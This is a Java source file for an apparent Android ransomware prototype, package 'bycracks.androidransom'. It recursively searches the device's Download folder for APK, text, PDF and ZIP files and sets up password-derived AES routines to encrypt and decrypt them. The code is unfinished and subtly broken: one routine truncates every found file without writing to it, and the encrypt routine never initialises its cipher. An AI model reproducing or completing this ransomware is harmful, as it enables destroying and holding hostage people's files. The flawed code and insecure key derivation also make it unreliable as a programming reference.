package bycracks.androidransom;

import android.os.Environment;

import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.security.SecureRandom;
import java.util.ArrayList;

import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;

/**
 * Created by ByeongCheol on 2017-06-25.
 */

public class Search_Encrypt {
    String[] ext = {".apk", ".txt", ".pdf", ".zip"/*, ".hwp", ".ppt", ".pptx", ".jpg", ".jpeg"*/};
    ArrayList<File> fileList;
    ArrayList <String> fileNames;

    public Search_Encrypt() {
        fileList = new ArrayList<File>();
        fileNames = new ArrayList<String>();
    }

    public void encodeProcess() throws Exception{
        File[] files = new File[fileList.size()];
        files = fileList.toArray(files);

        for(File inFile: fileList) {
            BufferedOutputStream bos = new BufferedOutputStream(new FileOutputStream(inFile));
        }


    }

    public File getTopDir() {
        String rootSD = Environment.getRootDirectory().toString();
        return new File(rootSD + "/../storage/emulated/0/Download");
    }

    // 파일 검색
    public ArrayList<File> searchAllFile(File topDir){
        File[] files = topDir.listFiles();
        if (files == null) return null;

        for(File inFile : files) {
            if (inFile.isDirectory()) {
                searchAllFile(inFile);
            }
            for (String list : ext)
                if (inFile.getName().endsWith(list)) {
                    fileNames.add(inFile.getName());
                    fileList.add(inFile);
                }

        }
        return fileList;
    }


    /** 암호화 구역 */
    public static byte[] generateKey(String pw) throws Exception
    {
        byte[] keyStart = pw.getBytes("UTF-8");

        KeyGenerator kgen = KeyGenerator.getInstance("AES");
        SecureRandom sr = SecureRandom.getInstance("SHA1PRNG", "Crypto");
        sr.setSeed(keyStart);
        kgen.init(128, sr);
        SecretKey skey = kgen.generateKey();

        return skey.getEncoded();
    }

    public static byte[] encodeFile(byte[] key, byte[] fileData) throws Exception {
        SecretKeySpec skeySpec = new SecretKeySpec(key, "AES");
        Cipher cipher = Cipher.getInstance("AES");

        byte[] encrypted = cipher.doFinal(fileData);

        return encrypted;
    }

    public static byte[] decodeFile(byte[] key, byte[] fileData) throws Exception {
        SecretKeySpec skeySpec = new SecretKeySpec(key, "AES");
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(Cipher.DECRYPT_MODE, skeySpec);

        byte[] decrypted = cipher.doFinal(fileData);

        return decrypted;
    }
}
